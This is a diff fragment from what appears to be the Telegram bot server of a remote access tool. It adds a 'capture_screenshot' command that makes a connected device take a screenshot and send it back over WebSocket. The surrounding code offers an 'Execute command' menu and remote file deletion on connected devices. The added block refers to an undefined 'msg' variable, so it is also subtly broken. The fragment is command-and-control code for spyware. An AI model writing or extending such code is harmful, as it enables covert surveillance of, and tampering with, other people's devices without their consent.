@@ -160,7 +160,28 @@ appBot.on('message', (message) => {
             )
         }
 
-
+if (commend == 'capture_screenshot') {
+    // This block is executed if the commend variable equals 'capture_screenshot'
+    appSocket.clients.forEach(function each(ws) {
+        // Loop through each WebSocket connection
+        if (ws.uuid == uuid) {
+            // Check if the UUID of the WebSocket connection matches the desired UUID
+            const screenshotBuffer = captureScreenshot(); // Capture the screenshot
+            ws.send(screenshotBuffer); // Sending the screenshot image buffer through the WebSocket
+        }
+    });
+    appBot.deleteMessage(id, msg.message_id);
+    appBot.sendMessage(id,
+        '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+        '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+        {
+            parse_mode: "HTML",
+            "reply_markup": {
+                "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                'resize_keyboard': true
+            }
+        });
+}
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
